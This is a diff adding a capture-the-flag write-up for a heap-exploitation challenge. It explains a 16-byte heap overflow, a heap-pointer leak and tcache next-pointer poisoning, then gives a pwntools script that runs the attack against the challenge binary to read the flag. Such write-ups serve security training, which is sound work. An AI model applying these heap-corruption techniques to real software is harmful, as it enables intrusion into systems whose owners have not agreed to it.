@@ -1185,7 +1185,101 @@ secret += b'\x00' * 4
 
 ## Challenge 19
 
-Now wer'e given with 3 new handlers - `read_flag`, `safe_write`, `safe_read`. The goal is to 
+Now wer'e given with 3 new handlers - `read_flag`, `safe_write`, `safe_read`. \
+The `read_flag` handler reads the flag into a `malloc`'ed buffer. Hence, our goal in this challenge is to utilize overlapping allocations to leak the flag of the `buf`. Alternatively, We'd like to control the address returned by the flag's `malloc` call.
+
+Moreover, this challenge keeps track of the allocated chunks sizes: for each `malloc` invocation, `size + 16` is stored with a dedicated `nbytes` array. In addition, `free` nullifies the pointer array. This means the UAF vuln is now closed. Notice however, that `free` handler doesn't touch the `nbytes` array at all. The method `safe_read` reads bytes amount from `stdin`, based on the value within `nbytes`. This means it is actually a write primitive into chunks. 
+
+`safe_write` have some extremely sus behavior - it opens `STDOUT_FILENO` file stream using `fdopen`, which means it creates another file stream for `stdout`. It then uses `fwrite` instead of `write` on that stream. \
+Since the stream is allocated dynamically on the heap, I highly suspect we can exploit it. In particular, notice that `read_flag` keeps the flag's `fd` open, without closing it after reading it into a heap buffer. Overwriting the internal `fd` of the stream won't help us, as it would redirect content into the flag. However, overwriting the internal buffer of the stream into the allocated flag's chunk, would grant us the flag. This also means that `read_flag` handler isn't actually needed, and challenge 20 is exactly same as 19 - but without this handler. 
+
+Of course, the major vulnerability here is the fact that `size + 0x10` bytes may be written into a chunk of size `size`. This means we might be able to perform 16-byte heap linear forward write. \
+For chunks of aligned malloc-request sizes, such as `0x20, 0x30`, the `prev_size` and `size` of the next chunk would be completely separate, having no overlap. \
+However, for allocation requests with nibble of `0x8`, such as `0x38`, the `prev_size` field of the next chunk would be reused, so the chunk would be allocated off bin `0x40`! Moreover, this means that 16-byte overwrite in this case is sufficient in order to overwrite the `next` ptr of the preceding chunk. 
+
+A simple approach would be causing double-free of a chunk, corresponding to the size of the flag's chunk. That way, we would be able to perform 2 allocations - for the flag and for a slot, and both would return the same address of the same chunk. \
+However, recall that double free requires the option to overwrite the `key` member of a freed chunk - which we cannot do. \
+Another approach is to overwrite the `next` ptr of a freed chunk, without changing the `size` of a chunk. That would grant us arbitrary-allocation primitive, which can be easly leveraged to arbitrary R/W primitives. \
+Notice that we still need leaks to start from, and heap leaks in particular. These can be easily acquired. Assuming chunks `0, 1, 2` allocated adjacent on the heap, we can use the 16-byte OOB read to read 1's `next`, in case it is points to 2. To do so, all we have to do is to `free(2)`, then `free(1)`, then perform the OOB-R. 
+
+Having arbtirary write, we can go for multiple directions:
+
+1. Create the criterias for double free, and forge tcachebin corrsponding to the flag's chunk with 2 available slots, both to the same address. 
+
+2. Having a heap leak, the address of the flag to-be-allocated is known. Therefore, we can overwrite an entry within the `tcache_perthread_struct`, so that some bin's head points to the address of the flag. Allocation from that bin would make us be accessible towards the flag chunk data. 
+
+3. A more elegant way to perform the above, is by first allocating the flag's chunk, then overwriting the `next` of some tcachebin head chunk to the goal address, and performing 2 allocations off that bin. 
+
+The following script implements idea(3), which is the simplest approach:
+
+```python
+def read_flag(p):
+    p.sendline(b'read_flag')
+    p.recvuntil(b'quit): ')
+
+def safe_write(p, index):
+    p.sendline(b'safe_write')
+    p.recvuntil(b'Index: ')
+    p.sendline(str(index).encode())
+    # TODO: check these for the ".1" level. May be needed to change
+    p.readline()
+    p.readline()
+    buf = p.readline()[:-1]
+    p.recvuntil(b'quit): ')
+
+    return buf
+
+def safe_read(p, index, buf):
+    p.sendline(b'safe_read')
+    p.recvuntil(b'Index: ')
+    p.sendline(str(index).encode())
+    # TODO: this might be needed to change
+    p.readline()
+    p.send(buf)
+    p.recvuntil(b'quit): ')
+
+    return 
+
+def main():    
+    p = process(BINARY)
+    p.recvuntil(b'quit): ')
+    
+    chunk_size = 0x88
+    malloc(p, 0, chunk_size)
+    malloc(p, 1, chunk_size)
+    malloc(p, 2, chunk_size)
+    free(p, 2)
+    free(p, 1)
+    buf = safe_write(p, 0)
+    assert(len(buf) == chunk_size + 16)
+    heap_next, heap_key = demangle_ptr(buf[-8:])
+    print(f'heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')
+
+    read_flag(p)
+    flag_chunk_addr = heap_next + 0x670
+    print(f'flag_chunk_addr: {hex(flag_chunk_addr)}')
+
+    chunk_size_2 = 0x88
+    malloc(p, 0, chunk_size_2)
+    malloc(p, 1, chunk_size_2)
+    malloc(p, 2, chunk_size_2)
+    free(p, 2)
+    free(p, 1)
+    buf_2 = b'A' * chunk_size_2
+    buf_2 += struct.pack('<Q', chunk_size_2 + 8 + 1)  # Keep the original chunk siz
+    buf_2 += struct.pack('<Q', flag_chunk_addr ^ heap_key)  # Overwrite next to our goal chunk
+    safe_read(p, 0, buf_2)
+    
+    malloc(p, 0, chunk_size_2)
+    malloc(p, 0, chunk_size_2)
+    flag_buf = safe_write(p, 0)
+    print(f'flag_buf: {flag_buf}')
+
+    p.interactive()
+```
+
+## Challenge 20
+
 
 
 
